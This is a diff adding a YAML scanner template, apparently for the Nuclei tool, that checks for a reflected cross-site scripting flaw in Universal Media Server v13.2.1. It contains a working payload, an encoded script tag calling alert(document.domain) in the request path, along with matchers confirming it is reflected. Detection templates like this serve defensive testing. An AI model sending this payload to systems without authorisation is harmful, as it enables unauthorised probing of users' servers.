@@ -1,0 +1,28 @@
+id: universal-media-xss
+name: Universal Media Server v13.2.1 - Cross Site Scripting
+severity: medium
+confidence: confirmed
+description: Universal Media Server v13.2.1 CMS v2.0 was discovered to contain a reflected cross-site scripting (XSS) vulnerability.
+reference: https://packetstormsecurity.com/files/171754/Universal-Media-Server-13.2.1-Cross-Site-Scripting.html
+tags:
+- xss
+- universal
+- media
+- unauth
+- packetstorm
+- vuln
+requests:
+- method: GET
+  path: /%3Cscript%3Ealert(document.domain)%3C/script%3E
+  matchers:
+  - type: body
+    words:
+    - <script>alert(document.domain)</script>
+    - 404 - File Not Found
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
